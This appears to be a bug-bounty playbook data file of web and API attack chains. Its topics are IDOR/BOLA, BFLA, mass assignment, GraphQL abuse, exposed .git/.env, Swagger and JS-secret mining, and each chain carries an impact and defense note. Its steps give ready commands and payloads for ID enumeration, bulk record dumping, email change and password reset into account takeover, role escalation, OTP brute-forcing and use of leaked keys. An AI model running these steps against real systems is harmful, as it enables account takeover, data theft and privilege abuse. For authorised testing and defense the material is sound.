chains.title: REST IDOR: enumerating objects up to account takeover (numeric + UUID)
chains.impact: Read/modify any user's data and full account takeover via email change; ATO on mature programs.
chains.why: Object-reference bugs are the most common and lucrative finding for a beginner, leading straight to account takeover.
chains.precondition: An authenticated application that passes an object id in the URL or body (/api/users/1007, ?account_id=, "userId":), and a second test account for comparison.
chains.realWorld: PortSwigger WSA 'Insecure direct object references' labs; OWASP API1:2023 BOLA; recurring HackerOne ATO-via-email-change reports.
chains.defense: Verify object ownership on the server (not just authentication); alert on 200s where the requester is not the resource owner.

steps.title: Find all requests carrying an object id
steps.detail: proxy normal usage through Burp; flag /api/users/{id}, ?id=, "userId" in bodies; baseline GET /api/users/1007 (your id) = 200 + your data

steps.title: Decrement/increment the id manually
steps.detail: in Repeater change 1007 -> 1006/1008
steps.success: 200 with another user's PII in the response = IDOR

steps.title: Automate the enumeration
steps.detail: ffuf -u https://t/api/users/FUZZ -H "Cookie: session=..." -w <(seq 1 5000) -mc 200 -fs <baseline-len>

steps.title: Confirm with a second account
steps.detail: Autorize: log in as user B, set user A token as low-priv, replay; 'Authz bypassed!' = real

steps.title: UUID variant: harvest and replay
steps.detail: pull other users' UUIDs from list endpoints/shared links/emails, replay GET /api/users/{leaked-uuid}

steps.title: Escalate read to write
steps.detail: PUT /api/users/1006 {"email":"{EMAIL}"}
steps.success: 200 and the victim's email is changed

steps.title: Reset the password and take over the account
steps.detail: request reset; token lands on attacker email -> set new password -> ATO

chains.title: BOLA: mass PII harvesting via /api/{id}
chains.impact: Bulk extraction of other users' records (orders, invoices, tickets, files) = a reportable data breach depending on sensitivity and volume.
chains.why: An API exposes many object types beyond the profile, and it is the scale that raises the payout.
chains.precondition: A REST API with object endpoints like /api/orders/{id}, /api/invoices/{id}, /api/documents/{uuid} and one valid session.
chains.realWorld: OWASP API1:2023 BOLA; PortSwigger API testing methodology; common HackerOne 'access other users orders/invoices' reports.
chains.defense: Object-level authorization middleware keyed on the (caller, owner) pair; rate-limit and detect sequential id enumeration.

steps.title: Enumerate all object routes
steps.detail: from Swagger/JS/proxy history list /api/{orders,invoices,tickets,documents}/{id}

steps.title: Confirm BOLA with a cross-account replay
steps.detail: Autorize two sessions; request user B's /api/orders/9001 as user A

steps.title: Determine the id space
steps.detail: sequential ints -> enumerable; random UUID -> pivot to harvest-and-replay

steps.title: Bulk-enumerate valid records
steps.detail: ffuf -u https://t/api/invoices/FUZZ -w <(seq 1 20000) -H "Authorization: Bearer ..." -mc 200 -fr "not found"

steps.title: Dump and quantify the scale
steps.detail: loop hits: curl -s -H "Authorization: Bearer ..." https://t/api/invoices/$ID | jq '{id,email,total}'; count unique victims

steps.title: Test writes (write-side BOLA)
steps.detail: PATCH /api/orders/9001 {"shipping_address":"..."} as another user; 200 = tamper others' objects

steps.title: Assemble impact evidence
steps.detail: redacted sample of N victims + the single decisive request/response pair

chains.title: BFLA: a regular user invokes admin functions
chains.impact: Performing admin operations as a regular user (creating users, changing roles, deleting/reading all data), often full compromise of the admin panel.
chains.why: Authorization is often enforced only in the UI/menu, while the admin API still responds to a low-privilege token.
chains.precondition: An application with role separation and privileged endpoints (/api/admin/*, role actions) and a low-privilege account.
chains.realWorld: OWASP API5:2023 BFLA; PortSwigger 'Broken function level authorization' labs; recurring admin-API-via-normal-user reports.
chains.defense: Centralized, deny-by-default RBAC enforced at the gateway/server for every privileged route and method.

steps.title: Find admin/privileged routes
steps.detail: ffuf -u https://t/api/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,403 -H "Authorization: Bearer <low-priv>"

steps.title: Search docs/JS for privileged calls
steps.detail: grep Swagger/JS for admin, role, internal, /manage, promote

steps.title: Replay an admin action with a low-privilege token
steps.detail: POST /api/admin/users {"email":"x","role":"admin"} with low-priv bearer
steps.success: 200/201 from an admin endpoint as low-priv = BFLA

steps.title: Try HTTP method override
steps.detail: flip GET /api/users/9001 to DELETE/PUT, or add header X-HTTP-Method-Override: PUT

steps.title: Confirm with a role matrix in Autorize
steps.detail: admin session as enforcement baseline, low-priv as test; 'Bypassed!' on admin routes

steps.title: Prove privesc: elevate a user to admin
steps.detail: PUT /api/users/9001/role {"role":"admin"} as low-priv -> re-login, confirm elevation

steps.title: Reduce to data/account control
steps.detail: use the new admin function to dump users or reset a victim password

chains.title: Excessive data exposure: the API returns what the UI hides
chains.impact: Collecting sensitive fields the client never displays (password hashes, reset tokens, api_key, PII, internal flags) as a springboard for escalation.
chains.why: The easiest API win: you change nothing, you just read the full JSON the server oversends.
chains.precondition: Any JSON API behind a web or mobile client.
chains.realWorld: OWASP API3:2023 Broken Object Property Level Authorization (ex-Excessive Data Exposure, API3:2019); PortSwigger API testing notes.
chains.defense: Build the response from a server-side allow-list (serializer); never rely on the client to hide fields.

steps.title: Read the raw JSON, not the rendered UI
steps.detail: in Burp, diff fields shown on screen vs the full response body
steps.success: the JSON has fields that are absent from the UI

steps.title: Search for valuable keys
steps.detail: grep -iE '"(password|token|hash|ssn|secret|role|is_admin|email|phone)"' response.json

steps.title: Pull full self/detail objects
steps.detail: GET /api/users/me often returns more than the profile page (api_key, reset_token)

steps.title: Check for nested other-user data
steps.detail: list endpoints like /api/feed, /api/orders sometimes inline other users' records

steps.title: Compare the mobile and web APIs
steps.detail: mobile /v1/ endpoints frequently overshare; proxy the app, replay in Repeater

steps.title: Escalate a leaked field
steps.detail: if reset_token/api_key leaks, use it directly: reset victim password or call the API as them

chains.title: Mass Assignment + HPP: privilege escalation
chains.impact: Setting hidden privileged attributes you should not control (role, is_admin, verified, balance, tenant_id) -> privesc or financial impact.
chains.why: Frameworks auto-bind JSON to the model, so extra keys silently stick when the backend forgot an allow-list.
chains.precondition: Write endpoints that bind the request body to an object (registration, profile update, order creation).
chains.realWorld: OWASP API3:2023 (BOPLA) Mass Assignment + OWASP HTTP Parameter Pollution; classic Rails/GitHub 'create_admin' cases.
chains.defense: Strict server-side allow-lists for bindable fields; canonicalize and reject duplicate parameters at the gateway.

steps.title: Capture a baseline profile/registration write
steps.detail: baseline PUT /api/users/me {"name":"..."} in Repeater

steps.title: Discover hidden parameters
steps.detail: arjun -u https://t/api/users/me -m JSON  (or Burp Param Miner: guess JSON params)

steps.title: Inject privileged keys
steps.detail: add "role":"admin", "is_admin":true, "email_verified":true, "tenant_id":1
steps.success: a follow-up GET shows role=admin / elevated privileges

steps.title: Mirror field names from GET
steps.detail: whatever the object returns (isStaff, plan) is a mass-assignment candidate on write

steps.title: HPP: send duplicate parameters
steps.detail: user_id=me&user_id=9001 or role=user&role=admin; back-end may take first/last/array

steps.title: HPP across parsing layers
steps.detail: try query-vs-body duplicates and role[]=admin; proxy and back-end disagree -> authz bypass

steps.title: Confirm the privilege
steps.detail: re-login or call an admin-only route; elevated access = proven

chains.title: GraphQL: introspection, sensitive fields, batching and aliases
chains.impact: Full schema disclosure -> querying sensitive fields, rate-limit bypass via batching/aliases (credential stuffing, OTP brute-forcing), exploiting field-level authz gaps.
chains.why: A single introspection query reveals the entire API contract, including fields and mutations the UI never calls.
chains.realWorld: PortSwigger 'GraphQL API vulnerabilities' labs; HackTricks GraphQL; common HackerOne GraphQL authz/batching reports.
chains.defense: Disable introspection in production, enforce field-level authz, limit query depth/alias count/batch size, and rate-limit per operation.

steps.title: Find the endpoint
steps.detail: ffuf -u https://t/FUZZ -w graphql-paths.txt -mc 200  for graphql, graphiql, v1/graphql, api/graphql

steps.title: Run an introspection query
steps.detail: POST {"query":"{__schema{types{name fields{name}}}}"}
steps.success: a full type list comes back = introspection is enabled

steps.title: Reconstruct the schema automatically
steps.detail: InQL (Burp), or clairvoyance https://t/graphql -o schema.json -w words.txt if introspection is disabled

steps.title: Query sensitive fields directly
steps.detail: query{users{id email phone passwordResetToken}}; data back = field-level authz gap

steps.title: Check per-node field-level authz (BOLA in GraphQL)
steps.detail: as a normal user, user(id:9001){email} of someone else returning data = broken object authz

steps.title: Bypass the rate limit with aliases and batching
steps.detail: aliases: mutation{a:login(u:"x",p:"1"){t} b:login(u:"x",p:"2"){t}}; or send JSON array [{"query":...},{"query":...}] for OTP/credential brute

steps.title: Probe mutations for privesc
steps.detail: mutation{updateUser(id:9001,role:ADMIN){id}} using args you already read from the schema

chains.title: Exposed /.git and .env: source code and live secrets
chains.impact: Full source-code recovery plus hardcoded secrets (DB credentials, cloud keys, JWT signing secret) -> often direct server/data compromise.
chains.why: One botched deploy serves the entire codebase and working keys with no authentication at all.
chains.precondition: A web root that serves VCS/config artifacts (/.git/, /.env, backups, or directory listing).
chains.realWorld: git-dumper tooling; numerous disclosed .git/.env exposure reports on HackerOne; general technique.
chains.defense: Block dotfiles/VCS directories at the web server, keep secrets in a vault outside the web root, and rotate immediately on leak.

steps.title: Probe for exposed VCS/config artifacts
steps.detail: ffuf -u https://t/FUZZ -w <list> -mc 200  for .git/HEAD, .env, .git/config, config.php.bak, .svn/

steps.title: Confirm /.git is browsable
steps.detail: curl -s https://t/.git/HEAD
steps.success: ref: refs/heads/main = the repository is dumpable

steps.title: Dump the whole repository
steps.detail: git-dumper https://t/.git/ ./loot

steps.title: Or pull a listed directory
steps.detail: if listing is on: wget -r -np https://t/backup/

steps.title: Comb the dump for secrets
steps.q: CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)
steps.detail: trufflehog filesystem ./loot --only-verified  and  gitleaks detect -s ./loot

steps.title: Read .env directly
steps.detail: curl -s https://t/.env  for DB_PASSWORD=, AWS_SECRET_ACCESS_KEY=, JWT_SECRET=

steps.title: Escalate via the found secrets
steps.detail: use DB creds / cloud keys / forge JWTs signed with the leaked secret

chains.title: Exposed API docs (Swagger/OpenAPI/Postman): the entire attack surface
chains.impact: A complete authoritative map of endpoints and parameters (often with undocumented admin/debug routes), instantly feeding IDOR/BFLA/mass-assignment.
chains.why: Why guess endpoints when the server publishes the spec itself? It is the fastest path to full surface coverage.
chains.precondition: Exposed API documentation or schema (/swagger, /openapi.json, /api-docs, a Postman collection, or a GraphQL playground).
chains.realWorld: OWASP API testing methodology; common exposed-Swagger / public-Postman-collection reports; general technique.
chains.defense: Do not ship interactive docs/specs to production without authentication; put /swagger, /api-docs, and the playground behind auth.

steps.title: Find the docs/spec
steps.detail: ffuf -u https://t/FUZZ -w <list> -mc 200  for swagger-ui.html, openapi.json, api-docs, v2/api-docs, graphiql
steps.success: 200 on swagger/openapi = the spec is accessible

steps.title: Download the machine-readable spec
steps.detail: curl -s https://t/openapi.json -o spec.json  (or swagger.json)

steps.title: Import into a client for one-click requests
steps.detail: load spec.json into Postman or Burp's OpenAPI parser to generate every request

steps.title: Flag the juicy operations
steps.detail: sort for admin, delete, internal, debug, {id} path params, and unauth-looking routes

steps.title: Find undocumented versions
steps.detail: try /v1 -> /v2/v3 and /internal/ siblings not linked in the UI

steps.title: Run the endpoints through authz tests
steps.detail: run the generated requests through Autorize to mass-check IDOR/BFLA

steps.title: Open the GraphQL playground if present
steps.detail: /graphiql or /playground gives free introspection + a query runner

chains.title: Mining JS bundles: hidden endpoints and hardcoded secrets
chains.impact: Undocumented/admin API routes plus hardcoded secrets (API keys, Firebase configs, third-party tokens) in the front-end JS -> new surface and sometimes direct key use.
chains.why: SPA front-ends hand the full map of their API, and often live secrets, to every anonymous visitor right in the JS bundles.
chains.precondition: A JS-heavy web application (a React/Vue/Angular SPA) with downloadable bundles.
chains.realWorld: LinkFinder / jsluice tooling; recurring 'secrets in JS bundles' HackerOne reports; general technique.
chains.defense: Keep secrets server-side, scan bundles in CI (trufflehog/gitleaks), and scope/rotate any key that reaches the client.

steps.title: Collect all JS URLs (current + historical)
steps.detail: gau target.com | grep '\.js' > js.txt  and  katana -u https://t -jc -d 3 | grep '\.js'

steps.title: Download the bundles
steps.detail: cat js.txt | xargs -n1 curl -sO

steps.title: Extract endpoints/paths
steps.detail: linkfinder -i 'https://t/*.js' -o cli  or  jsluice urls main.js  -> collect /api/... routes

steps.title: Search for hardcoded secrets
steps.q: JS secret scanner (API keys / tokens / private keys)
steps.detail: trufflehog filesystem ./js --only-verified  and  cat js.txt | mantra

steps.title: Quick string search
steps.detail: grep -roiE '(api[_-]?key|secret|token|firebaseio\.com|/api/[a-z/]+)' ./js

steps.title: Test the discovered endpoints
steps.detail: replay newly found /api/internal/* in Repeater; many lack the UI's auth gating

steps.title: Check for live keys
steps.detail: check leaked keys: Firebase open DB at /.json, Google Maps key billing, Stripe live/test
